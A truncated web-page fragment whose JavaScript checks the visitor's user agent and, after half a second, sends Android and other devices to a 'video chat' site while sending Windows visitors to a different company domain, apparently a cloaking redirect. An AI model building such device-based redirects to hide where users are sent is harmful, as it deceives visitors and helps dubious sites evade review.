  <div id="status"></div>

  <script>
    function isAndroid() {
      const ua = navigator.userAgent.toLowerCase();
      return ua.includes('android') || ua.includes('linux; android');
    }

    function isWindows() {
      const ua = navigator.userAgent.toLowerCase();
      return ua.includes('windows');
    }

    function redirect() {
      const status = document.getElementById('status');

      if (isAndroid()) {
        // Android cihazlar için
        setTimeout(() => {
          window.location.href = 'https://goruntulusohbetzamani.vercel.app/';
        }, 500);
      } else if (isWindows()) {
        // Windows cihazlar için
        setTimeout(() => {
          window.location.href = 'https://www.kocalar.com.tr/';
        }, 500);
      } else {
        // Diğer cihazlar için
        setTimeout(() => {
          window.location.href = 'https://goruntulusohbetzamani.vercel.app/';
        }, 500);

    }

    // Yönlendirmeyi başlat
